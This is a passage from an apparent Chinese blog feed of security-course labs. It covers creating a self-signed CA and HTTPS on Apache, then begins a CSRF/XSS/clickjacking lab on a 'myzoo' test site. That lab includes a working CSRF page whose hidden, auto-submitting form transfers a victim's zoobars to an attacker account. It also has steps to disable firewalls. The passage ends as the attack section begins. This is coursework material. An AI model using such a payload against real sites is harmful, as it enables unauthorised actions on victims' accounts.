certificates.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca ]</span></span><br><span class="line">dir             = /home/username/myCA                    # 这里要将username替换为你的用户名</span><br><span class="line">certificate     = $dir/cacert.pem</span><br><span class="line">database        = $dir/index.txt</span><br><span class="line">new_certs_dir   = $dir/signedcerts</span><br><span class="line">private_key     = $dir/private/cakey.pem</span><br><span class="line">serial          = $dir/serial</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default expiration and encryption policies for certificates.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">default_crl_days        = 365</span></span><br><span class="line">default_days            = 1825</span><br><span class="line">default_md              = SHA256</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line">policy          = local_ca_policy</span><br><span class="line">x509_extensions = local_ca_extensions</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default policy to use when generating server certificates.  The following</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">fields must be defined <span class="keyword">in</span> the server certificate.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca_policy ]</span></span><br><span class="line">commonName              = supplied</span><br><span class="line">stateOrProvinceName     = supplied</span><br><span class="line">countryName             = supplied</span><br><span class="line">emailAddress            = supplied</span><br><span class="line">organizationName        = supplied</span><br><span class="line">organizationalUnitName  = supplied</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># x509 extensions to use when generating server certificates.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca_extensions ]</span></span><br><span class="line">subjectAltName          = DNS:localhost</span><br><span class="line">basicConstraints        = CA:false</span><br><span class="line">nsCertType              = server</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The default root certificate generation policy.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ req ]</span></span><br><span class="line">default_bits    = 2048</span><br><span class="line">default_keyfile = /home/username/myCA/private/cakey.pem  # 这里要将username替换为你的用户名</span><br><span class="line">default_md      = SHA256</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line">prompt                  = no</span><br><span class="line">distinguished_name      = root_ca_distinguished_name</span><br><span class="line">x509_extensions         = root_ca_extensions</span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Root Certificate Authority distinguished name.  Change these fields to match</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">your <span class="built_in">local</span> environment!</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ root_ca_distinguished_name ]</span></span><br><span class="line">commonName              = MyOwn Root Certificate Authority # CA机构名</span><br><span class="line">stateOrProvinceName     = JS                               # CA所在省份</span><br><span class="line">countryName             = CN                               # CA所在国家（仅限2个字符）</span><br><span class="line">emailAddress            = XXXX@XXX.com                     # 邮箱</span><br><span class="line">organizationName        = XXX                              # </span><br><span class="line">organizationalUnitName  = XXX                              # </span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line">[ root_ca_extensions ]</span><br><span class="line">basicConstraints        = CA:true</span><br></pre></td></tr></table></figure>

<p>生成CA根证书和密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/caconfig.cnf       #该命令用于给环境变量 OPENSSL_CONF 赋值为caconfig.cnf。</span><br><span class="line">openssl req -x509 -newkey rsa:2048 -out cacert.pem -outform PEM -days 1825             # 生成 CA 根证书和密钥</span><br></pre></td></tr></table></figure>

<p>该命令需要用户设置密码。不要忘记。<br>以上步骤生成了 CA 自签名根证书，和 RSA 公&#x2F;私密钥对。证书的格式是 PEM，有效期是1825天。</p>
<ul>
<li>&#x2F;myCA&#x2F;cacert.pem: CA 根证书</li>
<li>&#x2F;myCA&#x2F;private&#x2F;cakey.pem： CA 私钥</li>
</ul>
<h3 id="创建服务器公私钥"><a href="#创建服务器公私钥" class="headerlink" title="创建服务器公私钥"></a>创建服务器公私钥</h3><p>生成服务器配置文件exampleserver.cnf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/myCA/exampleserver.cnf</span><br></pre></td></tr></table></figure>

<p>exampleserver.cnf文件内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># exampleserver.cnf</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ req ]</span></span><br><span class="line">prompt             = no</span><br><span class="line">distinguished_name = server_distinguished_name</span><br><span class="line">[ server_distinguished_name ]</span><br><span class="line">commonName              = localhost          # 服务器域名</span><br><span class="line">stateOrProvinceName     = JS                 # 服务器所在省份</span><br><span class="line">countryName             = CN                 # 服务器所在国家（仅限2个字符）</span><br><span class="line">emailAddress            = XXXX@XXX.com       # 邮箱</span><br><span class="line">organizationName        = XXX                # </span><br><span class="line">organizationalUnitName  = XXX                # </span><br></pre></td></tr></table></figure>

<p>生成服务器证书和密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/exampleserver.cnf   # 该命令设置环境变量 OPENSSL_CONF，使得 openssl 更换配置文件。</span><br><span class="line">openssl req -newkey rsa:2048 -keyout tempkey.pem -keyform PEM -out tempreq.pem -outform PEM</span><br></pre></td></tr></table></figure>

<p>同样的，需要输入密码短语。<br>之后，有2种对临时秘钥的操作，选择其一即可<br>1.将临时私钥转换为 unencrypted key，即秘钥不加密状态。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -in tempkey.pem -out server_key.pem</span><br></pre></td></tr></table></figure>

<p>需要输入密码短语。</p>
<p>2.如果希望将 key 保持为加密状态，直接改名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv tempkey.pem server_key.pem</span><br></pre></td></tr></table></figure>

<p>两者的区别是，第二种需要在服务器启动时输入私钥的密码短语，否则会导致服务器启动失败，但第二种安全性高于第一种，可以更好的保护秘钥。</p>
<h3 id="使用CA-key对服务器证书签名"><a href="#使用CA-key对服务器证书签名" class="headerlink" title="使用CA key对服务器证书签名"></a>使用CA key对服务器证书签名</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/caconfig.cnf</span><br><span class="line">openssl ca -in tempreq.pem -out server_crt.pem</span><br></pre></td></tr></table></figure>

<p>删除临时证书和密码文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f tempkey.pem &amp;&amp; rm -f tempreq.pem</span><br></pre></td></tr></table></figure>

<p>现在，自签名的服务器证书和密钥对便产生了：</p>
<ul>
<li>server_crt.pem : 服务器证书文件</li>
<li>server_key.pem : 服务器密钥文件</li>
</ul>
<h3 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h3><p>安装apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>



<p>建立ssl配置文件，lab-ssl.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-available/lab-ssl.conf</span><br></pre></td></tr></table></figure>

<p>lab-ssl.conf文件内容如下：</p>
<p>注意这里有两处username需要换成你的用户名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_ssl.c&gt;</span><br><span class="line">	&lt;VirtualHost _default_:443&gt;</span><br><span class="line">		ServerAdmin webmaster@localhost</span><br><span class="line"></span><br><span class="line">		DocumentRoot /var/www/html</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">error, crit, alert, emerg.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">It is also possible to configure the loglevel <span class="keyword">for</span> particular</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">modules, e.g.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">LogLevel info ssl:warn</span></span><br><span class="line"></span><br><span class="line">		ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">		CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">For most configuration files from conf-available/, <span class="built_in">which</span> are</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">enabled or disabled at a global level, it is possible to</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">include a line <span class="keyword">for</span> only one particular virtual host. For example the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">following line enables the CGI configuration <span class="keyword">for</span> this host only</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">after it has been globally disabled with <span class="string">&quot;a2disconf&quot;</span>.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">Include conf-available/serve-cgi-bin.conf</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSL Engine Switch:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Enable/Disable SSL <span class="keyword">for</span> this virtual host.</span></span><br><span class="line">		SSLEngine on</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  A self-signed (snakeoil) certificate can be created by installing</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  the ssl-cert package. See</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  /usr/share/doc/apache2/README.Debian.gz <span class="keyword">for</span> more info.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  If both key and certificate are stored <span class="keyword">in</span> the same file, only the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSLCertificateFile directive is needed.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCertificateFile	/etc/ssl/certs/ssl-cert-snakeoil.pem</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">网站证书和私钥地址</span></span><br><span class="line">		SSLCertificateFile    /home/username/myCA/server_crt.pem # 这里的username需要换成你的用户名</span><br><span class="line">		SSLCertificateKeyFile /home/username/myCA/server_key.pem # 这里的username需要换成你的用户名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Server Certificate Chain:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Point SSLCertificateChainFile at a file containing the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  concatenation of PEM encoded CA certificates <span class="built_in">which</span> form the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  certificate chain <span class="keyword">for</span> the server certificate. Alternatively</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  the referenced file can be the same as SSLCertificateFile</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  when the CA certificates are directly appended to the server</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  certificate <span class="keyword">for</span> convinience.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Certificate Authority (CA):</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Set the CA certificate verification path <span class="built_in">where</span> to find CA</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  certificates <span class="keyword">for</span> client authentication or alternatively one</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  huge file containing all of them (file must be PEM encoded)</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Note: Inside SSLCACertificatePath you need <span class="built_in">hash</span> symlinks</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 to point to the certificate files. Use the provided</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 Makefile to update the <span class="built_in">hash</span> symlinks after changes.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCACertificatePath /etc/ssl/certs/</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCACertificateFile /etc/apache2/ssl.crt/ca-bundle.crt</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Certificate Revocation Lists (CRL):</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Set the CA revocation path <span class="built_in">where</span> to find CA CRLs <span class="keyword">for</span> client</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  authentication or alternatively one huge file containing all</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  of them (file must be PEM encoded)</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Note: Inside SSLCARevocationPath you need <span class="built_in">hash</span> symlinks</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 to point to the certificate files. Use the provided</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 Makefile to update the <span class="built_in">hash</span> symlinks after changes.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCARevocationPath /etc/apache2/ssl.crl/</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Client Authentication (Type):</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Client certificate verification <span class="built_in">type</span> and depth.  Types are</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  none, optional, require and optional_no_ca.  Depth is a</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  number <span class="built_in">which</span> specifies how deeply to verify the certificate</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  issuer chain before deciding the certificate is not valid.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLVerifyClient require</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLVerifyDepth  10</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSL Engine Options:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Set various options <span class="keyword">for</span> the SSL engine.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  o FakeBasicAuth:</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 Translate the client X.509 into a Basic Authorisation.  This means that</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 the standard Auth/DBMAuth methods can be used <span class="keyword">for</span> access control.  The</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 user name is the `one line<span class="string">&#x27; version of the client&#x27;</span>s X.509 certificate.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 Note that no password is obtained from the user. Every entry <span class="keyword">in</span> the user</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 file needs this password: `xxj31ZMTZzkVA<span class="string">&#x27;.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o ExportCertData:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This exports two additional environment variables: SSL_CLIENT_CERT and</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 SSL_SERVER_CERT. These contain the PEM-encoded certificates of the</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 server (always existing) and the client (only existing when client</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 authentication is used). This can be used to import the certificates</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 into CGI scripts.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o StdEnvVars:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This exports the standard SSL/TLS related `SSL_*&#x27;</span> environment variables.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 Per default this exportation is switched off <span class="keyword">for</span> performance reasons,</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 because the extraction step is an expensive operation and is usually</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 useless <span class="keyword">for</span> serving static content. So one usually enables the</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 exportation <span class="keyword">for</span> CGI and SSI requests only.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  o OptRenegotiate:</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 This enables optimized SSL connection renegotiation handling when SSL</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 directives are used <span class="keyword">in</span> per-directory context.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLOptions +FakeBasicAuth +ExportCertData +StrictRequire</span></span><br><span class="line">		&lt;FilesMatch &quot;\.(cgi|shtml|phtml|php)$&quot;&gt;</span><br><span class="line">				SSLOptions +StdEnvVars</span><br><span class="line">		&lt;/FilesMatch&gt;</span><br><span class="line">		&lt;Directory /usr/lib/cgi-bin&gt;</span><br><span class="line">				SSLOptions +StdEnvVars</span><br><span class="line">		&lt;/Directory&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSL Protocol Adjustments:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  The safe and default but still SSL/TLS standard compliant shutdown</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  approach is that mod_ssl sends the close notify alert but doesn<span class="string">&#x27;t wait for</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  the close notify alert from client. When you need a different shutdown</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  approach you can use one of the following variables:</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o ssl-unclean-shutdown:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This forces an unclean shutdown when the connection is closed, i.e. no</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 SSL close notify alert is send or allowed to received.  This violates</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 the SSL/TLS standard but is needed for some brain-dead browsers. Use</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 this when you receive I/O errors because of the standard approach where</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 mod_ssl sends the close notify alert.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o ssl-accurate-shutdown:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This forces an accurate shutdown when the connection is closed, i.e. a</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 SSL close notify alert is send and mod_ssl waits for the close notify</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 alert of the client. This is 100% SSL/TLS standard compliant, but in</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 practice often causes hanging connections with brain-dead browsers. Use</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 this only for browsers where you know that their SSL implementation</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 works correctly.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  Notice: Most problems of broken clients are also related to the HTTP</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  keep-alive facility, so you usually additionally want to disable</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  keep-alive for those clients, too. Use variable &quot;nokeepalive&quot; for this.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  Similarly, one has to force some clients to use HTTP/1.0 to workaround</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  their broken HTTP/1.1 implementation. Use variables &quot;downgrade-1.0&quot; and</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  &quot;force-response-1.0&quot; for this.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">BrowserMatch &quot;MSIE [2-6]&quot; \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">		#		nokeepalive ssl-unclean-shutdown \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">		#		downgrade-1.0 force-response-1.0</span></span></span><br><span class="line"></span><br><span class="line">	&lt;/VirtualHost&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span></span><br></pre></td></tr></table></figure>

<p>启动ssl服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2ensite /etc/apache2/sites-available/lab-ssl.conf</span><br><span class="line">sudo a2enmod ssl</span><br></pre></td></tr></table></figure>

<p>让浏览器信任我们自建的CA</p>
<p>打开 FireFox 浏览器，依次选择“编辑”—-“首选项”—-“隐私与安全”—-“证书”—-“查看证书”—-“证书机构”，点击导入，选择 myCA 目录下的根证书“cacert.pem”, 导入。</p>
<p>在浏览器地址栏输入 <a href="https://localhost/">https://localhost</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211804732.png" alt="img"></p>
]]></content>
      <categories>
        <category>信息安全实践</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全实践Lab3-CSRF&amp;XSS&amp;Click Jacking</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab3-CSRF&amp;XSS&amp;%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h1 id="信息安全实践Lab3-CSRF-amp-XSS-amp-Click-Jacking"><a href="#信息安全实践Lab3-CSRF-amp-XSS-amp-Click-Jacking" class="headerlink" title="信息安全实践Lab3-CSRF&amp;XSS&amp;Click Jacking"></a>信息安全实践Lab3-CSRF&amp;XSS&amp;Click Jacking</h1><p>该实验可以在一台虚拟机上完成，本文采用两台虚拟机的方式，myzoo网站所在虚拟机ip：10.211.55.14 , 攻击者网站所在虚拟机ip：10.211.55.16 。</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在zoobar网站上展示并防御CSRF攻击。请注意在防御时的粒度问题，防止所有人的token都一样；以及刷新太快，正常操作都失败。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>先在myzoo网站注册两个账号 victim和csrfattack。</p>
<p>攻击者服务器所在虚拟机配置(10.211.55.16)：</p>
<p>1.安装apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>

<p>2.关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>

<p>3.配置hosts</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">在最后添加 </span><br><span class="line">10.211.55.14  www.myzoo.com  #这里的ip填写myzoo服务器的ip地址</span><br><span class="line">127.0.0.1 www.attack.com </span><br></pre></td></tr></table></figure>

<p>4.编写index.html文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cd /var/www/html</span><br><span class="line">sudo vim index.html</span><br><span class="line">将下面的内容复制进去即可</span><br></pre></td></tr></table></figure>

<p><strong>index.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>my profile<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;it&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;450px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">target</span>=<span class="string">&quot;it&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;zoobars&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;recipient&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;csrfattack&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submission&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://106.13.136.87:8080/101.jpeg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transferform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>myzoo网站所在虚拟机配置(10.211.55.14):</p>
<p>1.关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>

<p>2.配置hosts</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">在最后添加 </span><br><span class="line">127.0.0.1  www.myzoo.com</span><br><span class="line">10.211.55.16 www.attack.com #这里的ip填写攻击者服务器的ip地址</span><br></pre></td></tr></table></figure>

<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>1.在csrfattack账号的profile中写入：</p>
